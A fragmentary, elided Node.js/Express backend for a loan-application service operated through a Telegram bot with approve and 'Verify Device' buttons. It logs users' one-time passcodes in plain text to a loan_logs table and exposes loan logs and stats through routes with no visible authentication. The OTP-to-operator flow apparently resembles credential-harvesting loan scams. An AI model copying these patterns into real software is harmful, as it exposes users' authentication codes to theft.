...
// Save loan application (from verify page)
        ...
        const replyMarkup = {
            inline_keyboard: [
                [
                    ...
                    { text: "📱 Verify Device", callback_data: `verify_device_${loanId}` }
                ],
                [
...
app.post('/api/update-otp', async (req, res) => {
    try {
        ...
        await db.run(
            `INSERT INTO loan_logs (loan_id, action, details)
             VALUES (?, ?, ?)`,
            [loanId, 'otp_sent', `OTP sent to ${otp}`]
        );
...
// Get loan logs
app.get('/api/loan/:loanId/logs', async (req, res) => {
    try {
        const logs = await db.all(
            `SELECT action, details, created_at FROM loan_logs WHERE loan_id = ? ORDER BY created_at DESC`,
            [req.params.loanId]
        );
...
app.get('/api/stats', async (req, res) => {
    try {
        const totalLoans = await db.get(`SELECT COUNT(*) as count FROM loans`);
        const approvedLoans = await db.get(`SELECT COUNT(*) as count FROM loans WHERE status = 'approved'`);
        const pendingLoans = await db.get(`SELECT COUNT(*) as count FROM loans WHERE status LIKE 'pending%'`);
        const totalAmount = await db.get(`SELECT SUM(amount) as total FROM loans WHERE status = 'approved'`);
    ...
    try {
        ...
        if (update.callback_query) {
            ...
            if (action === 'approve') {
                ...
                // Send OTP to user (in real system, send via SMS)
                ...
                await editTelegramMessage(
                    update.callback_query.message.message_id,
                    `📋 <b>ALREADY APPLIED</b>\n\nLoan ID: ${loanId}\nPhone: ${loan.phone}\nStatus: Previous application exists`
                );
